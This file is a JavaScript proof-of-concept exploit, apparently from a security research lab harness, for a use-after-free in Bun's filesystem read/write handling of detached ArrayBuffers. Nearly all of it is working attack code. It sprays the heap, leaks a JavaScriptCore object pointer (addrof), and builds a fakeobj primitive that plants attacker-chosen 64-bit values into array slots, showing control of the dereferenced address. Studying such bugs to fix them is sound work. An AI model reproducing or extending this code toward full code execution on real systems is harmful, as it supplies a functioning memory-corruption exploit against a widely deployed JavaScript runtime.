// Focused fakeobj probe built on top of the controlled-write primitive
// proven by lab/harnesses/13-arb-rw-probes/fs-uaf-object-ref-roundtrip.js
// and the addrof primitive in lab/harnesses/13-arb-rw-probes/object-bridge-addrof-probe.js.
//
// Goal: prove that we can plant an attacker-chosen 64-bit value into a JS
// object-array slot through the BufferSource UAF, and that JSC will
// dereference that value as a JSCell* when normal JS code reads the slot.
//
// Two evidence modes:
//
//   FAKE_TARGET=anchor (default)
//     Plant a real anchor JSCell pointer (leaked first via addrof) into a
//     fresh sentinel-array slot. Reading the slot returns the anchor by
//     identity. This is the safe roundtrip — no crash, just identity
//     transfer from one allocation to another.
//
//   FAKE_TARGET=hex:0xDEADBEEFDEADBEE0
//     Plant an attacker-chosen invalid pointer (must be 8-byte aligned;
//     low bits are deliberately 0). Then read the slot. JSC will
//     dereference the bits as a JSCell*; we expect a SEGV at the chosen
//     address. This is the controlled-native-effect proof — the program
//     counter is dictated by JS-level data we wrote.
//
//   FAKE_TARGET=hex:0x0
//     Read the slot expecting a NULL deref crash.
//
// The probe always emits a JSON line with what was attempted and what was
// observed. If the run was supposed to crash, ASAN's crash report is the
// proof; the JSON line will only appear on the safe path.

import fs from "node:fs";
import { spawnSync } from "node:child_process";
import { join } from "node:path";
import { tmpdir } from "node:os";

const size = Number(process.env.BUF_SIZE || 8192);
const slots = Number(process.env.SLOTS || 1024);
const sprayCount = Number(process.env.SPRAY_COUNT || 4096);
const elementOffset = Number(process.env.ELEMENT_OFFSET || 144);
const fillChunkSize = Number(process.env.FILL_CHUNK_SIZE || 4096);
const maxFillBytes = Number(process.env.MAX_FILL_BYTES || 1 << 20);
const readTimeoutMs = Number(process.env.READ_TIMEOUT_MS || 5000);
const fakeTargetSpec = process.env.FAKE_TARGET || "anchor";
const sentinel = { kind: "sentinel" };
const anchors = Array.from({ length: 64 }, (_, i) => ({ kind: "anchor", i }));

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function detach(ab) {
  if (typeof ab.transfer === "function") ab.transfer(0);
  else structuredClone({}, { transfer: [ab] });
}

function gcNow() {
  if (typeof globalThis.Bun?.gc === "function") globalThis.Bun.gc(true);
  if (typeof globalThis.gc === "function") globalThis.gc();
}

function makeFifo(label) {
  const path = join(tmpdir(), `bun-uaf-fakeobj-${label}-${process.pid}-${Math.random().toString(36).slice(2, 8)}`);
  const mk = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mk.status !== 0) throw new Error(`mkfifo failed: ${mk.status}`);
  const readFd = fs.openSync(path, fs.constants.O_RDONLY | fs.constants.O_NONBLOCK);
  const fillFd = fs.openSync(path, fs.constants.O_WRONLY | fs.constants.O_NONBLOCK);
  const writeFd = fs.openSync(path, fs.constants.O_WRONLY);
  return { path, readFd, fillFd, writeFd };
}

function closeFifo(f) {
  for (const fd of [f.writeFd, f.fillFd, f.readFd]) {
    try { fs.closeSync(fd); } catch {}
  }
  try { fs.unlinkSync(f.path); } catch {}
}

function isAgain(e) {
  return e?.code === "EAGAIN" || e?.code === "EWOULDBLOCK";
}

function fillFifo(f) {
  const chunk = Buffer.alloc(fillChunkSize, 0x2e);
  let filled = 0;
  while (filled < maxFillBytes) {
    try {
      const n = fs.writeSync(f.fillFd, chunk, 0, Math.min(chunk.length, maxFillBytes - filled));
      if (n === 0) break;
      filled += n;
    } catch (e) {
      if (isAgain(e)) break;
      throw e;
    }
  }
  if (filled === 0) throw new Error("fifo fill failed");
  return filled;
}

async function readExact(f, n, label) {
  const chunks = [];
  const scratch = Buffer.alloc(Math.min(8192, Math.max(1, n)));
  let total = 0;
  const deadline = Date.now() + readTimeoutMs;
  while (total < n) {
    try {
      const got = fs.readSync(f.readFd, scratch, 0, Math.min(scratch.length, n - total), null);
      if (got > 0) {
        chunks.push(Buffer.from(scratch.subarray(0, got)));
        total += got;
        continue;
      }
    } catch (e) {
      if (!isAgain(e)) throw e;
    }
    if (Date.now() >= deadline) throw new Error(`timed out ${label}`);
    await sleep(1);
  }
  return Buffer.concat(chunks, total);
}

function readU64LE(buf, off) {
  let v = 0n;
  for (let i = 7; i >= 0; i--) v = (v << 8n) | BigInt(buf[off + i]);
  return v;
}

function writeU64LE(v) {
  const out = Buffer.alloc(8);
  let x = v;
  for (let i = 0; i < 8; i++) {
    out[i] = Number(x & 0xffn);
    x >>= 8n;
  }
  return out;
}

// Use the leak side of the BufferSource UAF roundtrip to obtain the JSCell
// pointer of the first anchor. We need this both to assemble an "anchor"
// FAKE_TARGET and to confirm the address bits look right before planting
// our hex target.
async function leakAnchorPointer() {
  const fifo = makeFifo("leak");
  const retained = [];
  try {
    const filled = fillFifo(fifo);
    const ab = new ArrayBuffer(size);
    const source = new Uint8Array(ab);
    source.fill(0x51);
    const done = new Promise((resolve) => {
      fs.write(fifo.writeFd, source, 0, source.byteLength, null, (err, bytesWritten) => resolve({ err, bytesWritten }));
    });
    detach(ab);
    gcNow();
    for (let i = 0; i < sprayCount; i++) {
      const arr = new Array(slots);
      for (let j = 0; j < slots; j++) arr[j] = anchors[(i + j) & 63];
      retained.push(arr);
    }
    gcNow();
    await readExact(fifo, filled, "prefill");
    const leaked = await readExact(fifo, size, "leak");
    await done;
    return readU64LE(leaked, elementOffset);
  } finally {
    closeFifo(fifo);
    retained.length = 0;
  }
}

// Use the write side of the BufferSource UAF roundtrip to plant `bits` into
// element[0] of a freshly sprayed sentinel array. Returns the spray array
// where the planted bits landed and ready-to-trigger metadata.
async function plantBits(bits) {
  const path = join(tmpdir(), `bun-uaf-fakeobj-write-${process.pid}-${Math.random().toString(36).slice(2, 8)}`);
  const mk = spawnSync("mkfifo", [path], { stdio: "inherit" });
  if (mk.status !== 0) throw new Error(`mkfifo failed: ${mk.status}`);
  const fd = fs.openSync(path, fs.constants.O_RDWR);
  const retained = [];
  try {
    const ab = new ArrayBuffer(size);
    const target = new Uint8Array(ab);
    target.fill(0x51);
    const done = new Promise((resolve) => {
      fs.read(fd, target, elementOffset, 8, null, (err, bytesRead) => resolve({ err, bytesRead }));
    });
    detach(ab);
    gcNow();
    for (let i = 0; i < sprayCount; i++) {
      const arr = new Array(slots);
      for (let j = 0; j < slots; j++) arr[j] = sentinel;
      retained.push(arr);
    }
    gcNow();
    fs.writeSync(fd, writeU64LE(bits), 0, 8);
    await done;
    // Hand back the sprayed arrays so the caller can read element[0] in the
    // same JS context; otherwise GC could move/destroy the planted slot.
    return { retained: retained.slice(), bits };
  } finally {
    fs.closeSync(fd);
    fs.unlinkSync(path);
  }
}

function findPlanted(retained) {
  for (let i = 0; i < retained.length; i++) {
    const arr = retained[i];
    if (arr[0] !== sentinel) {
      return { arrayIndex: i, value: arr[0] };
    }
  }
  return null;
}

function classifyValue(v) {
  if (v === sentinel) return "sentinel";
  if (v === null || v === undefined) return typeof v;
  if (typeof v === "object") {
    for (let k = 0; k < anchors.length; k++) if (v === anchors[k]) return `anchor[${k}]`;
    return `object(${v.constructor?.name || "?"})`;
  }
  return typeof v;
}

let target;
if (fakeTargetSpec === "anchor") {
  target = await leakAnchorPointer();
} else if (fakeTargetSpec.startsWith("hex:")) {
  target = BigInt(fakeTargetSpec.slice(4));
} else {
  throw new Error(`unknown FAKE_TARGET ${JSON.stringify(fakeTargetSpec)}`);
}

const planted = await plantBits(target);
console.error(JSON.stringify({
  phase: "planted",
  fakeTargetSpec,
  bits: `0x${target.toString(16).padStart(16, "0")}`,
}));

// At this point the planted spray array's element[0] holds `target`. Now
// touch it from JS — JSC dereferences it as a JSCell*. If `target` is a
// real anchor JSCell, we get back the anchor identity. If `target` is an
// attacker-chosen invalid address, JSC SEGV's at that address.
const found = findPlanted(planted.retained);

const out = {
  phase: "read-back",
  fakeTargetSpec,
  plantedBits: `0x${target.toString(16).padStart(16, "0")}`,
  found: found && {
    arrayIndex: found.arrayIndex,
    classified: classifyValue(found.value),
  },
};
console.log(JSON.stringify(out));
process.exitCode = found ? 86 : 1;
